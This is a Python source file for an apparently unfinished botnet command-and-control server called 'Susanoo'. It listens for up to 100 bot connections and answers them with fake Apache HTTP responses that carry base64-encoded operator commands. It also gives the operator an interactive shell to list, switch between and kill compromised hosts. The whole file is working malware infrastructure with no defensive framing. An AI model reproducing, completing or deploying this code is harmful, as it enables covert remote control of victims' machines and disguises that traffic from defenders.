#!/usr/bin/python

import socket
import sys
import os
import multiprocessing
import threading
import queue
import time
import re
import base64
import signal
# from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

q = queue.Queue()
process_list = []
host_list = []
port_list = []
parent_pipe_list = []


# Tasks Needed to be done:
#     Write code to list all available commands for clientCmdShell
#     Find a way to format output in terminal
#     Create a Cookie
#     Write code to get data from client result and store it in a queue for later examination 
#     Usage of UP and DOWN arrow keys to switch between history
#     Find a way to use dictonaries rather than queues


def addToQueue(cmd_queue,child_pipe):
    while(True):
        cmd = child_pipe.recv()
        cmd_queue.put(cmd)



def clientExecuter(client,client_addr,child_pipe):

    cmd_queue = queue.Queue()
    pipe_thread = threading.Thread(target=addToQueue,args=(cmd_queue,child_pipe))
    pipe_thread.start()
    while(True):
        try:    
            data = client.recv(4096)
            data = data.decode('utf-8')
            # data = data.encode('utf-8')
            # print("[DEBUG] data Recieved\n{}".format(data))
            send_data = 'HTTP/1.0 200 OK\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Type: text/html\r\n\r\n'
            
            if (cmd_queue.empty()):
                cmd = "helloworld"
            else:
                cmd = cmd_queue.get()
            cmd_byte = cmd.encode('utf-8')

            if(re.findall('POST',data[:20])):
                send_data = send_data + 'POST request is recieved\r\n'
                # it means this is a result of some past request
            elif(re.findall('GET',data[:20])):
                base = base64.b64encode(cmd_byte).decode('utf-8')
                send_data = send_data + '<html>\n<body>' + base + '</body>\n</html>\r\n'
            else:
                send_data = send_data + 'NO Request method found\r\n'
            
            send_data = send_data.encode('utf-8')
            client.sendall(send_data)

        except Exception as ex:
            proc_name = multiprocessing.current_process().name
            print("\nConnection broken from {}:{} in {}".format(client_addr[0],str(client_addr[1]),proc_name))
            break

    pipe_thread.join()
    client.close()
    # Write code to get data from pipe and add commands to queue to execute and pipe back the data from the queue which stores result



def clientCmdShell(i):

    try:
        while(True):
            client_cmd = str(input("{}> ".format(process_list[i].name)))
            if(client_cmd == ""):
                pass
            elif(client_cmd == "help"):
                print("")
            elif(client_cmd == "yolo"):
                break
            elif(client_cmd =="lols"):
                break
                # Write code here to list all commands needed to send to this connection
            else:
                parent_pipe_list[i].send(client_cmd)
    except Exception as ex:
            print("\n[-] Unable to Read Command. Reason: {}\n".format(ex))    
            

def switch(process_name):

    try:
        flag = 0
        i = 0
        for i in range(len(process_list)):
            if(process_list[i].name == process_name):
                flag = 1
                break
        if(flag == 0):
            print("No process found by the name: {}".format(process_name))
        else:
            clientCmdShell(i)
    except Exception as ex:
            print("\n[-] Unable to Switch Process. Reason: {}\n".format(ex))



def handlerExecuter(cmd):

    try:
        if(cmd[:4]=='kill'):    # kill specified connection
            proc_name = cmd[5:]
            flag = 0
            for i in range(len(process_list)):
                if(process_list[i].name == proc_name):
                    process_list[i].terminate()
                    del process_list[i]
                    del parent_pipe_list[i]
                    del port_list[i]
                    del host_list[i]
                    print("[+] Process " + proc_name + " is terminated\n")
                    flag = 1
                    break
            if(flag == 0):
                print("[-] Process not found\n")
        elif(cmd[:7]=="killall"):   # kill all conntections
            flag = 0
            for i in range(len(process_list)):
                flag = 1
                proc_name = process_list[i].name
                process_list[i].terminate()
                del process_list[i]
                del parent_pipe_list[i]
                del host_list[i]
                del port_list[i]
                print("[+] Process " + proc_name + " is terminated\n")
            if(flag == 0):
                print("[-] Process not found\n")
        elif(cmd[:4] == "list"):    # list all the connected hosts
            # print("[DEBUG] inside list")
            for i in range(len(process_list)):
                proc_name = process_list[i].name
                hostname = host_list[i]
                port = port_list[i]
                print("{} => {}:{}".format(proc_name,hostname,port))
        elif(cmd[:6] == "switch"):
            process_name = cmd[7:]
            switch(process_name)
            # print("[DEBUG] switch")
        else:
            print("\nCOMMANDS:\nlist\t\t\t:\tto list all the connected devices\nkill {processname}\t:\tkill the specified connection\nkillall\t\t\t:\tkill all connected\nswitch {processname}\t:\tswitch to different connection\n")
    except Exception as ex:
            print("\n[-] Unable to execute Commands. Reason: {}\n".format(ex))


def ctrlCHandler(signum, frame):
    print("\nctrl-c is pressed to exit type \'exit\'")

def handlerCmdShell():

    try:
        while(True):
            handler_cmd = str(input("Susanoo> "))
            if(handler_cmd == ""):
                pass
            elif(handler_cmd == "exit"):
                print("[+] Killing all running processes\n")
                for proc in process_list:
                    time.sleep(0.1)
                    proc.terminate()
                time.sleep(2)
                os._exit(0)
                # Close all the process one by one and exit the program after that
            else:
                handlerExecuter(handler_cmd)
    except Exception as ex:
            print("\n[-] Unable to start a handlerCmdShell. Reason: {}\n".format(ex))
            os._exit(0)


def createConnectionProcess(client,client_addr):

    try:
        parent_pipe, child_pipe = multiprocessing.Pipe()        # Creating Pipe for connection to new processes
        parent_pipe_list.append(parent_pipe)                    # Appended to list to keep track of parent pipes
        host_list.append(client_addr[0])
        port_list.append(client_addr[1])
        new_process = multiprocessing.Process(target=clientExecuter,args=(client,client_addr,child_pipe))
        process_list.append(new_process)
        new_process.start()
        print("\n[+] {}:{} connected as {}".format(client_addr[0],str(client_addr[1]),new_process.name))
        # Created new process for every connection that I get and save the process in process_list
    except Exception as ex:
        print("\n[-] Unable to Create New Process for this Connection {}:{}. Reason: {}\n".format(client_addr[0],str(client_addr[1]),ex))



def listener(lhost,lport):

    try:
        signal.signal(signal.SIGINT,ctrlCHandler)
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((lhost,lport))
        sock.listen(100)
        # Started the listener which can handle 100 connections.
        print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
            
        handler_cmd_thread = threading.Thread(target=handlerCmdShell,args=())
        handler_cmd_thread.start()
        # Handler cmd shell started here.
        # It is running as serperate thread to give us an free cmd shell while listener runs in background.

        while(len(process_list)<100):
            (client,client_addr) = sock.accept()
            createConnectionProcess(client,client_addr)
        
        sock.close()
    except Exception as ex:
            print("\n[-] Unable to start a listener. Reason: {}\n".format(ex))
            os._exit(0)


def main():
    if(len(sys.argv) < 3):
        print("[!] Useage:\n[+] python {sys.argv[0]} LHOST LPORT\n")
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost,lport)

        except Exception as ex:
            print("\n[-] Unable to start a handler. Reason: {}\n".format(ex))
            # exit(0)



if __name__ == '__main__':
    main()